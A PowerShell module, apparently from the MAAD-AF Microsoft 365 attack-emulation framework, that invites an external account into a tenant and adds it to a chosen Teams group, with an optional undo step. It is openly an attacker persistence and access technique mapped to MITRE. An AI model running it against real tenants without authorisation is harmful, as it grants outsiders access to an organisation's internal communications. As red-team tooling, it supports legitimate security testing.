#External Teams Access

function ExternalTeamsInvite {
    
    mitre_details("ExternalTeamsAccess")

    EnterTeam("Enter the 'Display Name' of the team you would like to invite to")
    $target_team = $global:team_name


    #Create External Account
    try {
        #Attemp inviting account. This will automatically fail and the rest of the module will continue as intended if the account being added is an internal account. 
        #If the account being added is an external account then the account will be invited and the rest of the module will continue.
        $external_email_address = Read-Host -Prompt "`nEnter an (external or internal) email account to grant access to Teams (eg: external@domain.com)"
        New-AzureADMSInvitation -InvitedUserDisplayName "MAAD_AF-$external_email_address" -InvitedUserEmailAddress $external_email_address -InviteRedirectURL https://myapps.microsoft.com -SendInvitationMessage $true
    }
    catch {
        #Do nothing.
    }

    #Retrieve teams group ID
    $team_details = Get-Team -DisplayName $target_team 
    $group_id = $team_details.GroupId

    Write-Warning -Message "This configuration can sometimes take long to take effect."
    [int]$time_limit_min = (Read-Host -Prompt "`nSet a limit on how long you would like to wait (minutes)")
    [int]$time_limit_sec = $time_limit_min*60
    Write-Host "`nIts been a long day of hacking. Grab yourself some coffee!!! Checking for change confirmation...`n" -ForegroundColor Gray

    #Add to teams group while waiting for the change to take effect
    [int]$timer = 0
    while ($timer -le $time_limit_sec){
        try{
            Add-TeamUser -GroupId $group_id -Role Member -User $external_email_address -ErrorAction Stop
            Write-Host "`n[Success] Added new account: $external_email_address to teams group: $target_team" -ForegroundColor Yellow
            $allow_undo = $true
            break
        }
        catch{
            Write-Output "`nAccount hasn't replicated - Attempting again in 60 seconds" -ForegroundColor Gray
            Start-sleep -Seconds 60
            $timer = $timer+60
            Write-Host "Time remaining: $(($time_limit_sec - $timer)/60) minutes" -ForegroundColor Gray
        }
    } 

    if ($allow_undo -eq $true) {
        $user_choice = Read-Host -Prompt '`nWould you like to undo changes made in teams? (yes/no)'
        if ($user_choice -notin "No","no","N","n") {
            Write-Host "`nRemoving new user from team $target_team ..." -ForegroundColor Gray
            try {
                Remove-TeamUser -GroupId $group_id -User $external_email_address -ErrorAction Stop
                Write-Host "`n[Undo Success] Removed new user: $external_email_address from team: $target_team" -ForegroundColor Yellow
            }
            catch {
                Write-Host "`n[Error] Failed to remove new user $external_email_address from team $target_team" -ForegroundColor Red
            } 
        }
    }
    Pause
}